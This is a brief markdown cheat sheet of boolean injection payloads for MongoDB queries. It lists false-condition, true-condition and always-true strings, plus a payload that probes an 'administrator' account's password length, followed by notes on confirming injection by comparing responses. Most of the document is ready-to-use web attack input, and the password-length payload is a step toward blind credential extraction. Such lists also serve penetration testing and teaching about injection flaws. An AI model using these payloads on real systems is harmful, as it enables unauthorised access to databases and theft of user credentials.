# Boolean Injection Payloads

## False Condition

```text
' && 0 && 'x
```

---

## True Condition

```text
' && 1 && 'x
```

---

## Always True

```text
'||'1'=='1
```

---

## Password Length Test

```text
administrator' && this.password.length < 30 || 'a'=='b
```

---

# Purpose

These payloads confirm whether injected boolean expressions affect the MongoDB query.

---

# Expected Result

Different responses for true and false conditions indicate successful injection.

---

# Key Takeaways

- Boolean testing confirms query manipulation.
- Always compare true and false responses.